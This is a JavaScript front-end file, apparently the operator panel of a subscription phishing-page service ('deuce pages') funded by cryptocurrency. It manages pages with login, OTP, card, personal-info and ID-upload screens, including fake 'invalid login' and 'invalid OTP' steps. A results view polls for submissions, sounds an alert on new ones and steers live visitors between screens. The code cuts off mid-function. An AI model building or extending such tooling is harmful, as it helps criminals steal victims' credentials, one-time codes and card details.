const templates = [
  {
    id: "blackbox-template",
    name: "Blackbox Launch",
    description: "Private access page for tools, drops, and closed communities.",
    status: "BLACKBOX SESSION ACTIVE"
  },
  {
    id: "command-template",
    name: "Command Layer",
    description: "Premium security operations dashboard and telemetry view.",
    status: "OVERWATCH FEEDS SYNCHRONIZED"
  },
  {
    id: "vault-template",
    name: "Vault Identity",
    description: "Technical portfolio card for high-signal builders.",
    status: "IDENTITY VAULT MASKED"
  }
];

const templateList = document.querySelector("#templateList");
const preview = document.querySelector("#preview");
const statusText = document.querySelector("#statusText");
const copyButton = document.querySelector("#copyButton");
const randomButton = document.querySelector("#randomButton");
const swatches = document.querySelector("#swatches");
const themeToggle = document.querySelector("#themeToggle");
const topbarTitle = document.querySelector("#topbarTitle");
const appShell = document.querySelector(".app-shell");
const matrix = document.querySelector("#matrix");
const context = matrix.getContext("2d");
let activeTemplate = templates[0];

let marketPages = [];
let adminPackages = [];

const packageDataModel = {
  identity: ["id", "slug", "name", "type", "status", "version"],
  billing: ["billingPeriods.daily", "billingPeriods.weekly", "billingPeriods.biweekly", "billingPeriods.monthly"],
  source: ["sourceType", "repo", "screens", "assets", "cssFiles", "inlineCssBlocks"],
  design: ["tokens.brand", "tokens.font", "tokens.radius", "cssMode", "design"],
  audit: ["createdAt", "updatedAt"]
};

const userPageConfigModel = {
  identity: ["id", "userId", "packageId", "packageVersion", "status"],
  subscription: ["billingPeriod", "renewalPrice", "renewalDate", "autoRenew", "walletSource"],
  routing: ["domain", "allowedDomains", "generatedFile.version", "generatedFile.lastGeneratedAt"],
  hosting: ["hostingConfig.domain", "hostingConfig.serverIp", "hostingConfig.hostingType", "hostingConfig.installPath", "hostingConfig.verified"],
  flow: ["flow", "configs", "screenOrder", "disabledScreens"],
  security: ["captcha", "bannedIps", "whitelistIps", "trafficLog"],
  results: ["results", "resultSettings.webhook", "resultSettings.retentionDays", "resultSettings.notifyOnResult"]
};

let adminUsers = [];
let ownedPages = [];
let walletData = { balance: 0, currency: "USD", transactions: [] };
let walletDepositRequests = [];
let adminDepositRequests = [];
let walletFundOpen = false;
let walletHistoryOpen = false;
let walletFundingOptions = [];
let walletQuoteTimer = null;
const expandedAdminUsers = new Set();
const collabAdminUsers = new Set();
const selectedMarketPlans = {};
const billingPeriodLabels = {
  daily: "Daily",
  weekly: "Weekly",
  biweekly: "Biweekly",
  monthly: "Monthly"
};
const cryptoFundingOptions = [
  { value: "USDT_TRC20", asset: "USDT", network: "TRC20", label: "USDT - TRC20" },
  { value: "USDT_ERC20", asset: "USDT", network: "ERC20", label: "USDT - ERC20" },
  { value: "BTC_BTC", asset: "BTC", network: "BTC", label: "Bitcoin - BTC" },
  { value: "ETH_ERC20", asset: "ETH", network: "ERC20", label: "Ethereum - ERC20" },
  { value: "BNB_BEP20", asset: "BNB", network: "BEP20", label: "BNB - BEP20" }
];
walletFundingOptions = cryptoFundingOptions.map((option) => ({ ...option, address: "", configured: false }));
const minimumWalletFundingUsd = 30;

const screenLibrary = [
  {
    name: "Login",
    type: "Credential screen",
    fields: ["Email or username", "Password"],
    status: "Enabled"
  },
  {
    name: "OTP",
    type: "Verification screen",
    fields: ["6-digit code", "Resend timer"],
    status: "Enabled"
  },
  {
    name: "Personal Info",
    type: "Data collection screen",
    fields: ["Full name", "Phone", "Address"],
    status: "Enabled"
  },
  {
    name: "Success",
    type: "Completion screen",
    fields: ["Success message", "Redirect URL"],
    status: "Enabled"
  },
  {
    name: "Redirect",
    type: "Final route",
    fields: ["Destination URL", "Delay seconds"],
    status: "Optional"
  }
];

let activeFlowSlug = null;
let draggedScreenName = null;
let apiLoadError = "";
const appearanceStorageKey = "deuceAppearance";
let appBusyTimer = null;
const resultsAutoRefreshMs = 5000;
let resultsAutoRefreshTimer = null;
let resultsAutoRefreshSlug = "";
let resultsAutoRefreshBusy = false;
const resultNotificationSeenIds = new Map();
let resultNotificationAudioContext = null;

function setAppBusy(isBusy, label = "Working") {
  window.clearTimeout(appBusyTimer);
  document.body.classList.toggle("app-busy", Boolean(isBusy));
  appShell?.classList.toggle("is-loading", Boolean(isBusy));
  appShell?.setAttribute("data-busy-label", label);
  if (isBusy && statusText) statusText.textContent = label.toUpperCase();
}

function clearAppBusySoon(delay = 220) {
  window.clearTimeout(appBusyTimer);
  appBusyTimer = window.setTimeout(() => setAppBusy(false), delay);
}

function renderBootScreen(title = "Opening workspace", copy = "Loading your session, pages, wallet, and live controls.") {
  preview.innerHTML = `
    <section class="app-view app-loading-view">
      <div class="loader-orbit" aria-hidden="true">
        <span></span><span></span><span></span>
      </div>
      <div class="view-heading">
        <small>deuce pages</small>
        <h2>${escapeHtml(title)}</h2>
        <p>${escapeHtml(copy)}</p>
      </div>
      <div class="loading-rail" aria-hidden="true"><span></span></div>
    </section>
  `;
}

function pulseButton(button) {
  if (!button) return;
  button.classList.add("is-pressed");
  window.setTimeout(() => button.classList.remove("is-pressed"), 320);
}

function setButtonBusy(button, isBusy, label = "Working...") {
  if (!button) return;
  if (isBusy) {
    if (!button.dataset.originalHtml) button.dataset.originalHtml = button.innerHTML;
    button.classList.add("is-loading");
    button.setAttribute("aria-busy", "true");
    button.disabled = true;
    button.innerHTML = `<span class="button-roll" aria-hidden="true"></span><span>${escapeHtml(label)}</span>`;
    return;
  }
  button.classList.remove("is-loading");
  button.removeAttribute("aria-busy");
  button.disabled = false;
  if (button.dataset.originalHtml) {
    button.innerHTML = button.dataset.originalHtml;
    delete button.dataset.originalHtml;
  }
}

async function withButtonBusy(button, label, task) {
  setButtonBusy(button, true, label);
  try {
    return await task();
  } finally {
    setButtonBusy(button, false);
    clearAppBusySoon();
  }
}

function getAppearancePreference() {
  try {
    return JSON.parse(localStorage.getItem(appearanceStorageKey)) || {};
  } catch {
    return {};
  }
}

function saveAppearancePreference(nextPreference) {
  const current = getAppearancePreference();
  localStorage.setItem(appearanceStorageKey, JSON.stringify({ ...current, ...nextPreference }));
}

function setThemeMode(theme, persist = false) {
  const nextTheme = theme === "light" ? "light" : "dark";
  const isLight = nextTheme === "light";
  document.documentElement.dataset.theme = nextTheme;
  themeToggle?.setAttribute("aria-label", isLight ? "Switch to dark theme" : "Switch to light theme");
  if (themeToggle) {
    themeToggle.innerHTML = isLight
      ? '<span aria-hidden="true">&#9728;</span><strong>Light Mode</strong>'
      : '<span aria-hidden="true">&#127769;</span><strong>Dark Mode</strong>';
  }
  if (persist) saveAppearancePreference({ theme: nextTheme });
}

function setAccentColor(accent, persist = false) {
  const nextAccent = accent || "#7CFFB2";
  document.documentElement.style.setProperty("--accent", nextAccent);
  document.documentElement.style.setProperty("--line", `${nextAccent}33`);
  document.querySelectorAll(".swatch").forEach((item) => {
    item.classList.toggle("active", item.dataset.accent?.toLowerCase() === nextAccent.toLowerCase());
  });
  if (persist) saveAppearancePreference({ accent: nextAccent });
}

function applyAppearancePreference() {
  const preference = getAppearancePreference();
  setThemeMode(preference.theme || document.documentElement.dataset.theme || "dark");
  setAccentColor(preference.accent || "#7CFFB2");
}

async function saveFlowState(page) {
  try {
    await requestApi(`/api/user-pages/${page.id}/config`, {
      method: "PATCH",
      body: JSON.stringify({
        domain: page.domain,
        flow: page.flow,
        configs: page.configs || {},
        securityConfig: page.securityConfig || {},
        subscription: page.subscription || {},
        generatedFile: page.generatedFile || {},
        resultSettings: page.resultSettings || {},
        hostingConfig: page.hostingConfig || {}
      })
    });
  } catch (error) {
    statusText.textContent = `SAVE FAILED: ${error.message}`.toUpperCase();
  }
}

function getPageBySlug(pageSlug) {
  const key = String(pageSlug || "");
  return ownedPages.find((item) => (
    String(item.id || "") === key
    || String(item.slug || "") === key
    || String(item.packageId || "") === key
    || String(item.routeKey || "") === key
  )) || null;
}

function pageRouteKey(page = {}) {
  return page.id || page.routeKey || page.slug || page.packageId || "";
}

function normalizeAllowedHost(value = "") {
  return String(value || "").trim().toLowerCase().replace(/^https?:\/\//, "").replace(/\/.*$/, "").replace(/:\d+$/, "");
}

function isResultsRoute(pageSlug = "") {
  const hash = window.location.hash || "";
  return hash.startsWith("#results-") && (!pageSlug || hash.replace("#results-", "") === pageSlug);
}

function stopResultsAutoRefresh() {
  if (resultsAutoRefreshTimer) {
    window.clearInterval(resultsAutoRefreshTimer);
  }
  resultsAutoRefreshTimer = null;
  resultsAutoRefreshSlug = "";
  resultsAutoRefreshBusy = false;
}

function startResultsAutoRefresh(pageSlug) {
  if (!pageSlug || !isResultsRoute(pageSlug)) return;
  if (resultsAutoRefreshTimer && resultsAutoRefreshSlug === pageSlug) return;
  stopResultsAutoRefresh();
  resultsAutoRefreshSlug = pageSlug;
  resultsAutoRefreshTimer = window.setInterval(async () => {
    if (resultsAutoRefreshBusy) return;
    if (!isResultsRoute(pageSlug)) {
      stopResultsAutoRefresh();
      return;
    }
    resultsAutoRefreshBusy = true;
    try {
      await renderResultsCenter(pageSlug, { autoRefresh: true });
    } finally {
      resultsAutoRefreshBusy = false;
    }
  }, resultsAutoRefreshMs);
}

function resultNotificationId(result = {}) {
  return result.id || [result.sessionId, result.screen, result.createdAt, result.date, result.time].filter(Boolean).join(":");
}

function playNewResultTone() {
  const AudioContextType = window.AudioContext || window.webkitAudioContext;
  if (!AudioContextType) return;
  try {
    resultNotificationAudioContext = resultNotificationAudioContext || new AudioContextType();
    const context = resultNotificationAudioContext;
    if (context.state === "suspended") context.resume().catch(() => {});
    const oscillator = context.createOscillator();
    const gain = context.createGain();
    const now = context.currentTime;
    oscillator.type = "sine";
    oscillator.frequency.setValueAtTime(720, now);
    oscillator.frequency.exponentialRampToValueAtTime(540, now + 0.18);
    gain.gain.setValueAtTime(0.0001, now);
    gain.gain.exponentialRampToValueAtTime(0.08, now + 0.02);
    gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.24);
    oscillator.connect(gain);
    gain.connect(context.destination);
    oscillator.start(now);
    oscillator.stop(now + 0.26);
  } catch (error) {
    console.debug("Result notification tone skipped", error);
  }
}

function syncResultNotificationState(page, results = [], options = {}) {
  const pageKey = page.id || page.slug;
  if (!pageKey) return;
  const currentIds = new Set(results.map(resultNotificationId).filter(Boolean));
  const previousIds = resultNotificationSeenIds.get(pageKey);
  const hasNewSubmittedResult = Boolean(previousIds) && [...currentIds].some((id) => !previousIds.has(id));
  resultNotificationSeenIds.set(pageKey, currentIds);
  if (options.autoRefresh && hasNewSubmittedResult && page.resultSettings?.notifyOnResult !== false) {
    playNewResultTone();
  }
}

function renderMissingPage() {
  activeFlowSlug = null;
  stopResultsAutoRefresh();
  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>record not found</small>
        <h2>Page is not available</h2>
        <p>This page must come from a real subscription record before it can be configured.</p>
      </div>
      ${viewNav([
        routeButton("#my-pages", "My Pages", "primary"),
        routeButton("#pages", "Browse pages"),
        ...(isAdmin() ? [routeButton("#admin", "Admin")] : [])
      ])}
      ${emptyState("No page record loaded", "Connect the API/database or subscribe to a page package first.", "#pages")}
    </section>
  `;
  statusText.textContent = "PAGE RECORD REQUIRED";
  topbarTitle.textContent = "Page Required";
}

function getScreenConfig(page, screenName) {
  return {
    title: `${screenName} Page`,
    buttonText: screenName === "Success" || screenName === "Redirect" ? "Continue" : "Next",
    redirectUrl: "",
    fields: screenLibrary.find((screen) => screen.name === screenName)?.fields.join(", ") || "",
    ...(page.configs?.[screenName] || {})
  };
}

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function routeButton(hash, label, variant = "") {
  return `<button type="button" class="${variant}" data-route="${hash}">${label}</button>`;
}

function viewNav(buttons) {
  return `<nav class="view-nav" aria-label="Page navigation">${buttons.join("")}</nav>`;
}

function apiBase() {
  const isFile = window.location.protocol === "file:";
  return isFile ? "http://localhost:10000" : window.location.origin;
}

async function requestApi(path, options = {}) {
  const auth = getAuthState();
  const authHeaders = auth.token ? { Authorization: `Bearer ${auth.token}` } : {};
  let response;
  try {
    response = await fetch(`${apiBase()}${path}`, {
      headers: { "Content-Type": "application/json", ...authHeaders, ...(options.headers || {}) },
      ...options
    });
  } catch (error) {
    const apiError = new Error(`API connection failed at ${apiBase()}${path}`);
    apiError.status = 0;
    apiError.cause = error;
    throw apiError;
  }
  const data = await response.json().catch(() => ({}));
  if (!response.ok) {
    const error = new Error(data.error || `API request failed: ${response.status}`);
    error.status = response.status;
    error.data = data;
    throw error;
  }
  return data;
}

async function checkAdminApiConnection() {
  let health;
  try {
    health = await requestApi("/api/health");
  } catch (error) {
    return {
      ok: false,
      status: error.status || 0,
      title: "API connection failed",
      detail: `The app could not reach ${apiBase()}/api/health. Check Render deploy status, API_BASE_URL/CORS_ORIGINS, and that the web service is awake.`
    };
  }

  try {
    const session = await requestApi("/api/auth/me");
    if (String(session.user?.role || "").toLowerCase() !== "admin") {
      return {
        ok: false,
        status: 403,
        title: "Admin access required",
        detail: "GitHub import is an admin action. Log in with an email listed in ADMIN_EMAILS on Render, then refresh and try again."
      };
    }
    return { ok: true, health, user: session.user };
  } catch (error) {
    return {
      ok: false,
      status: error.status || 0,
      title: error.status === 401 ? "Login required" : "Admin session check failed",
      detail: error.status === 401
        ? "Log in first, then open Admin > Import > GitHub again."
        : error.message
    };
  }
}

function formatMoney(value) {
  return `$${Number(value || 0).toFixed(2).replace(/\.00$/, "")}`;
}

function billingPrice(pagePackage, period) {
  const billing = pagePackage.billingPeriods || {};
  return Number(billing[period] || billing.weekly || 25);
}

function billingLabel(period) {
  return billingPeriodLabels[period] || period;
}

function selectedBillingPeriod(pagePackage) {
  return selectedMarketPlans[pagePackage.slug] || "weekly";
}

function billingOptionLabel(pagePackage, period) {
  return `${billingLabel(period)} - ${formatMoney(billingPrice(pagePackage, period))}`;
}

function marketPriceLabel(pagePackage, period) {
  return isAdmin() ? `${billingLabel(period)} - Admin free` : billingOptionLabel(pagePackage, period);
}

function marketSubscribeLabel(pagePackage, period) {
  return isAdmin() ? "Activate free" : `Subscribe - ${formatMoney(billingPrice(pagePackage, period))}`;
}

function subscriptionState(page) {
  const subscription = page.subscription || {};
  if (subscription.adminFreeSubscription) {
    return {
      label: "Admin free",
      className: "is-free",
      dueLabel: "No renewal charge",
      canRenew: false
    };
  }

  const renewalDate = subscription.renewalDate || "";
  const today = new Date();
  today.setHours(0, 0, 0, 0);
  const renewal = renewalDate ? new Date(`${renewalDate}T00:00:00`) : null;
  const daysLeft = renewal && !Number.isNaN(renewal.getTime())
    ? Math.ceil((renewal.getTime() - today.getTime()) / 86400000)
    : null;
  const expired = daysLeft !== null && daysLeft < 0;
  const dueSoon = daysLeft !== null && daysLeft <= 3 && daysLeft >= 0;
  const paymentFailed = page.status === "payment_failed" || subscription.renewalStatus === "payment_failed";
  const locked = paymentFailed || page.status === "expired" || subscription.renewalStatus === "expired" || expired;

  return {
    label: paymentFailed ? "Payment failed" : locked ? "Expired" : dueSoon ? "Due soon" : subscription.autoRenew ? "Auto renew" : "Manual renew",
    className: paymentFailed ? "is-failed" : locked ? "is-expired" : dueSoon ? "is-due" : subscription.autoRenew ? "is-auto" : "is-manual",
    dueLabel: renewalDate || "Not scheduled",
    canRenew: true,
    expired: locked,
    dueSoon,
    paymentFailed,
    daysLeft
  };
}

function findPackageThumbnail(pagePackage) {
  if (pagePackage.packageManifest?.thumbnailPath) return pagePackage.packageManifest.thumbnailPath;
  const files = [
    ...(pagePackage.packageManifest?.files || []).map((file) => file.path || file),
    ...(pagePackage.assets || [])
  ].filter(Boolean);
  const preferred = [
    /(^|\/)favicon\.(ico|png|svg|webp)$/i,
    /(^|\/)apple-touch-icon\.(png|webp)$/i,
    /(^|\/)(site-)?logo\.(png|jpe?g|svg|webp)$/i,
    /(^|\/).*icon.*\.(png|svg|webp|ico)$/i,
    /(^|\/).*logo.*\.(png|jpe?g|svg|webp)$/i
  ];
  for (const pattern of preferred) {
    const match = files.find((file) => pattern.test(String(file)));
    if (match) return String(match);
  }
  return "";
}

function normalizePackage(pagePackage) {
  const billing = pagePackage.billingPeriods || {};
  const weekly = Number(billing.weekly || 25);
  const manifestScreens = pagePackage.packageManifest?.screens || [];
  const previewFile = manifestScreens.find((screen) => screen.role === "entry")?.file
    || manifestScreens[0]?.file
    || "";
  const cleanDescription = pagePackage.packageManifest?.description || "Ready to preview and subscribe.";
  return {
    ...pagePackage,
    billingPeriods: {
      daily: Number(billing.daily || Math.ceil(weekly / 5)),
      weekly,
      biweekly: Number(billing.biweekly || weekly * 2),
      monthly: Number(billing.monthly || weekly * 4)
    },
    type: pagePackage.packageManifest?.type || pagePackage.sourceType || "Page package",
    weeklyPrice: `${formatMoney(weekly)}/week`,
    prices: [
      `Daily ${formatMoney(billing.daily || Math.ceil(weekly / 5))}`,
      `Weekly ${formatMoney(weekly)}`,
      `Biweekly ${formatMoney(billing.biweekly || weekly * 2)}`,
      `Monthly ${formatMoney(billing.monthly || weekly * 4)}`
    ],
    description: cleanDescription,
    userSummary: cleanDescription,
    stats: [],
    source: pagePackage.sourceType === "github" ? "GitHub repo" : "Uploaded bundle",
    repo: pagePackage.repoUrl || "",
    cssMode: "",
    design: pagePackage.status || "Draft",
    price: `${formatMoney(weekly)}/week`,
    tokens: pagePackage.designTokens || {},
    inlineCssBlocks: pagePackage.packageManifest?.inlineCssBlocks || 0,
    previewFile,
    thumbnailDataUrl: pagePackage.packageManifest?.thumbnailDataUrl || "",
    thumbnailPath: findPackageThumbnail(pagePackage),
    previewReady: Boolean(pagePackage.packageManifest?.github && previewFile && pagePackage.previewToken)
  };
}

function normalizeUserPage(page) {
  const results = page.results || [];
  const routeKey = page.id || page.routeKey || page.slug || page.packageId || "";
  return {
    ...page,
    routeKey,
    slug: page.slug || routeKey,
    status: page.status || "active",
    traffic: page.traffic || "0 views",
    security: page.securityConfig?.captcha ? "Captcha on" : "Security ready",
    flow: page.flow || [],
    configs: page.configs || {},
    results,
    subscription: page.subscription || {},
    generatedFile: page.generatedFile || {},
    resultSettings: page.resultSettings || {},
    hostingConfig: page.hostingConfig || {},
    securityConfig: page.securityConfig || { domains: [], captcha: false, turnstile: { siteKey: "", secretKey: "" }, bannedIps: [], whitelistIps: [], blockedDevices: [], trafficLog: [] }
  };
}

function normalizeAdminUser(user) {
  const pages = (user.pages || []).map(normalizeUserPage);
  const spend = user.spend || {};
  return {
    ...user,
    name: user.name || user.email || "User",
    role: user.role || "subscriber",
    status: user.status || "active",
    walletBalance: Number(user.walletBalance ?? user.wallet ?? 0),
    collaboration: user.collaboration || {},
    spend: {
      totalSpent: Number(spend.totalSpent || 0),
      subscriptionSpend: Number(spend.subscriptionSpend || 0),
      totalFunded: Number(spend.totalFunded || 0),
      cryptoFunded: Number(spend.cryptoFunded || 0),
      adminCredits: Number(spend.adminCredits || 0),
      adminDebits: Number(spend.adminDebits || 0)
    },
    recentTransactions: user.recentTransactions || [],
    pages,
    pageCount: pages.length
  };
}

function adminUserById(userId) {
  return adminUsers.find((user) => user.id === userId) || null;
}

function syncAdminPageToggleFields(select) {
  const userId = select.dataset.adminPageSelect;
  const user = adminUserById(userId);
  const page = user?.pages?.find((item) => item.id === select.value);
  const freeToggle = preview.querySelector(`[data-admin-page-free="${userId}"]`);
  const autoRenewToggle = preview.querySelector(`[data-admin-page-autorenew="${userId}"]`);
  if (freeToggle) freeToggle.checked = Boolean(page?.subscription?.adminFreeSubscription);
  if (autoRenewToggle) autoRenewToggle.checked = Boolean(page?.subscription?.autoRenew);
}

function normalizePageResult(result) {
  const createdAt = result.createdAt || result.date || new Date().toISOString();
  const date = new Date(createdAt);
  const payload = result.payload || result.fields || {};
  const screen = result.screen || result.pageId || "Page";
  return {
    ...result,
    status: result.status || "New",
    screen,
    fields: resultDisplayFields(payload, screen),
    ip: result.ip || "unknown",
    date: Number.isNaN(date.getTime()) ? "--" : date.toLocaleDateString(),
    time: Number.isNaN(date.getTime()) ? "--" : date.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })
  };
}

function isInternalResultField(label) {
  const value = String(label || "");
  return value.startsWith("_") || ["redaction", "fieldCount", "field_count"].includes(value);
}

function redactedDisplayValue(value) {
  if (value === null || value === undefined || value === "" || value === "[blank]") return "[blank]";
  return "[redacted]";
}

function isOtpResultContext(screen = "", fields = {}) {
  const screenText = normalizeFlowLabel(screen);
  if (screenText.includes("otp") || screenText.includes("verification")) return true;
  return Object.keys(fields).some((label) => {
    const text = normalizeFlowLabel(label);
    return text.includes("otp") || text.includes("verification code") || text === "code";
  });
}

function isOtpDigitField(label = "") {
  const text = normalizeFlowLabel(label);
  if (text.includes("otp") || text.includes("verification code")) return true;
  if (/\b(first|second|third|fourth|fifth|sixth|digit|code)\b/i.test(text)) return true;
  if (/\b\d(?:st|nd|rd|th)?\s*(digit|code)\b/i.test(text)) return true;
  return false;
}

function normalizeOtpResultFields(fields = {}, screen = "") {
  const entries = Object.entries(fields).filter(([label]) => !isInternalResultField(label));
  if (!entries.length || !isOtpResultContext(screen, fields)) return fields;

  const otpEntries = entries.filter(([label]) => isOtpDigitField(label));
  if (entries.length === 1 || otpEntries.length >= 2 || otpEntries.length === entries.length) {
    const hasBlank = entries.some(([, value]) => value === "[blank]" || value === "");
    return { Otp: hasBlank && entries.length === 1 ? "[blank]" : "[redacted]" };
  }

  return fields;
}

function resultDisplayFields(payload = {}, screen = "") {
  if (!payload || typeof payload !== "object" || Array.isArray(payload)) return {};
  const normalizedScreen = normalizeFlowLabel(screen);
  const screenKey = Object.keys(payload).find((key) => (
    key && typeof payload[key] === "object" && !Array.isArray(payload[key])
    && normalizeFlowLabel(key) === normalizedScreen
  ));
  const source = screenKey ? payload[screenKey] : payload;
  const fields = Object.entries(source || {}).reduce((nextFields, [label, value]) => {
    if (isInternalResultField(label)) return nextFields;
    if (value && typeof value === "object" && !Array.isArray(value)) {
      Object.entries(resultDisplayFields(value, label)).forEach(([nestedLabel, nestedValue]) => {
        nextFields[nestedLabel] = nestedValue;
      });
      return nextFields;
    }
    nextFields[label] = redactedDisplayValue(value);
    return nextFields;
  }, {});
  return normalizeOtpResultFields(fields, screen);
}

function splitRuleList(value = "") {
  return String(value || "")
    .split(/\n|,/)
    .map((item) => item.trim())
    .filter(Boolean)
    .filter((item, index, list) => list.indexOf(item) === index);
}

function reconcileIpRules(bannedIps = [], whitelistIps = []) {
  const whitelistSet = new Set(whitelistIps);
  return {
    bannedIps: bannedIps.filter((ip) => !whitelistSet.has(ip)),
    whitelistIps
  };
}

function applyPageSecurityConfig(page, securityConfig = {}) {
  page.securityConfig = { ...(page.securityConfig || {}), ...securityConfig };
  ownedPages = ownedPages.map((item) => item.id === page.id ? { ...item, securityConfig: page.securityConfig } : item);
  return page.securityConfig;
}

function resultTimestampValue(result = {}) {
  const value = new Date(result.createdAt || result.date || 0).getTime();
  return Number.isFinite(value) ? value : 0;
}

function resultSessions(results = []) {
  const sessions = new Map();
  results.forEach((result) => {
    const sessionId = result.sessionId || "no-session";
    const current = sessions.get(sessionId) || {
      sessionId,
      results: [],
      firstSeen: result.createdAt,
      lastSeen: result.createdAt,
      ip: result.ip || "unknown"
    };
    current.results.push(result);
    if (resultTimestampValue(result) < resultTimestampValue({ createdAt: current.firstSeen })) current.firstSeen = result.createdAt;
    if (resultTimestampValue(result) > resultTimestampValue({ createdAt: current.lastSeen })) {
      current.lastSeen = result.createdAt;
      current.ip = result.ip || current.ip;
    }
    sessions.set(sessionId, current);
  });
  return [...sessions.values()]
    .map((session) => ({
      ...session,
      results: session.results.sort((a, b) => resultTimestampValue(a) - resultTimestampValue(b))
    }))
    .sort((a, b) => resultTimestampValue({ createdAt: b.lastSeen }) - resultTimestampValue({ createdAt: a.lastSeen }));
}

const resultStepDefinitions = [
  ["login", "Login submitted"],
  ["login2", "Invalid login submitted"],
  ["otp", "OTP submitted"],
  ["otp2", "Invalid OTP submitted"],
  ["email", "Email submitted"],
  ["personal", "Personal info submitted"],
  ["card", "Card submitted"],
  ["upload", "Upload submitted"],
  ["thanks", "Thank you submitted"],
  ["other", "Other submitted"]
];

function resultStepKey(result = {}) {
  const value = normalizeFlowLabel([
    result.screen,
    result.pageId,
    result.path,
    result.file
  ].filter(Boolean).join(" "));
  if (value.includes("login2")) return "login2";
  if (value.includes("otp2")) return "otp2";
  if (value.includes("login") || value.includes("index")) return "login";
  if (value.includes("otp")) return "otp";
  if (value.includes("email")) return "email";
  if (value.includes("personal")) return "personal";
  if (value.includes("card")) return "card";
  if (value.includes("upload")) return "upload";
  if (value.includes("thanks") || value.includes("success")) return "thanks";
  return "other";
}

function resultStepCounts(results = []) {
  const counts = Object.fromEntries(resultStepDefinitions.map(([key]) => [key, 0]));
  results.forEach((result) => {
    counts[resultStepKey(result)] = (counts[resultStepKey(result)] || 0) + 1;
  });
  return counts;
}

function resultStepCountMarkup(results = []) {
  const counts = resultStepCounts(results);
  return `
    <article class="security-panel result-count-panel">
      <div class="result-count-grid">
        ${resultStepDefinitions.map(([key, label]) => `
          <div class="${counts[key] ? "has-results" : ""}">
            <span>${escapeHtml(label)}</span>
            <b>${String(counts[key] || 0).padStart(2, "0")}</b>
          </div>
        `).join("")}
      </div>
    </article>
  `;
}

function resultFieldMarkup(fields = {}, screen = "") {
  const displayFields = normalizeOtpResultFields(fields, screen);
  return Object.entries(displayFields)
    .filter(([label]) => !isInternalResultField(label))
    .map(([label, value]) => {
      const cleanLabel = String(label || "Field")
        .replace(/[_-]+/g, " ")
        .replace(/\s+/g, " ")
        .trim()
        .replace(/\b\w/g, (letter) => letter.toUpperCase());
      return `
    <div>
      <span>${escapeHtml(cleanLabel)}</span>
      <strong>${escapeHtml(String(value))}</strong>
    </div>
  `;
    }).join("");
}

function resultActionsMarkup(result, pageSlug) {
  return `
    <div class="result-actions">
      <button type="button" data-view-result="${escapeHtml(result.id)}" data-result-page="${escapeHtml(pageSlug)}">&#128269; View</button>
      <button type="button" data-ban-result-ip="${escapeHtml(result.id)}" data-result-page="${escapeHtml(pageSlug)}">&#128683; Ban IP</button>
      <button type="button" data-whitelist-result-ip="${escapeHtml(result.id)}" data-result-page="${escapeHtml(pageSlug)}">&#9989; Whitelist</button>
      <button type="button" data-delete-result="${escapeHtml(result.id)}" data-result-page="${escapeHtml(pageSlug)}">&#128465; Delete</button>
    </div>
  `;
}

function commandStatusLabel(command = null) {
  if (!command?.targetUrl) return "No command queued";
  const label = command.note || command.targetUrl;
  if (command.status === "delivered") return `Delivered: ${label}`;
  return `Queued: ${label}`;
}

function normalizeFlowLabel(value = "") {
  return String(value || "")
    .replace(/\.[a-z0-9]+$/i, "")
    .replace(/[-_]+/g, " ")
    .replace(/\b(error login|login2)\b/i, "login2")
    .replace(/\b(error otp|otp2)\b/i, "otp2")
    .replace(/\b(login page|login)\b/i, "login")
    .replace(/\b(otp page|otp)\b/i, "otp")
    .replace(/\b(upload id|photo id|file upload|upload)\b/i, "upload")
    .replace(/\b(personal info page|personal info|personal)\b/i, "personal")
    .replace(/\b(email page|email)\b/i, "email")
    .replace(/\b(card page|card|c)\b/i, "card")
    .replace(/\b(thank you page|thanks|thnks)\b/i, "thanks")
    .trim()
    .toLowerCase();
}

function sessionCurrentFlowLabel(session = null, latestResult = null, command = null) {
  return session?.screen
    || latestResult?.screen
    || command?.note
    || "";
}

function sessionCommandMarkup(sessionId, pageSlug, pageTargets = [], command = null, currentLabel = "") {
  const currentKey = normalizeFlowLabel(currentLabel);
  return `
    <div class="session-command result-live-command">
      <strong class="flow-command-title">One-click flow</strong>
      <div class="session-route-buttons" aria-label="Redirect active user">
        ${pageTargets.length ? pageTargets.map((target) => {
          const isCurrent = currentKey && normalizeFlowLabel(target.label) === currentKey;
          return `
          <button type="button" class="${isCurrent ? "is-current" : ""}" data-session-redirect="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}" data-session-target-url="${escapeHtml(target.url)}" data-session-target-label="${escapeHtml(target.label)}" data-session-force-reload="${target.forceReload ? "true" : "false"}" aria-pressed="${isCurrent ? "true" : "false"}" ${isCurrent && !target.forceReload ? "disabled" : ""}>
            ${escapeHtml(target.label)}
          </button>
        `;
        }).join("") : "<span>No mapped pages found</span>"}
      </div>
      <button type="button" data-session-clear="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}">Clear</button>
      <small class="${command?.status === "delivered" ? "is-delivered" : command?.targetUrl ? "is-queued" : ""}">${escapeHtml(commandStatusLabel(command))}</small>
    </div>
  `;
}

function activeSessionCardMarkup(session, page, pageTargets = [], command = null) {
  const routeKey = pageRouteKey(page);
  return `
    <article class="active-session-card">
      <div>
        <small>${escapeHtml(session.event || "page_load")} / ${escapeHtml(session.result || "allowed")}</small>
        <h4>${escapeHtml(session.ip || "unknown")}</h4>
        <p>${escapeHtml(session.screen || "page")} ${session.path ? `/ ${escapeHtml(session.path)}` : ""}</p>
      </div>
      <div class="session-meta">
        <span>${escapeHtml(formatTrafficTime(session.lastSeenAt))}</span>
        <span>${escapeHtml(commandStatusLabel(command))}</span>
      </div>
      ${sessionCommandMarkup(session.sessionId, routeKey, pageTargets, command, sessionCurrentFlowLabel(session, null, command))}
    </article>
  `;
}

function latestSessionCommand(sessionId, sessionCommands = {}, sessionCommandHistory = {}) {
  const active = sessionCommands[sessionId];
  if (active?.targetUrl) return active;
  const history = sessionCommandHistory[sessionId];
  if (Array.isArray(history)) return history[0] || null;
  return history?.targetUrl ? history : null;
}

function sessionResultDetailMarkup(session, page) {
  const routeKey = pageRouteKey(page);
  if (!session.results.length) {
    return `
      <article class="result-card compact">
        <div class="result-head">
          <div>
            <small>Waiting</small>
            <h3>No result submitted yet</h3>
          </div>
          <span>live session</span>
        </div>
      </article>
    `;
  }

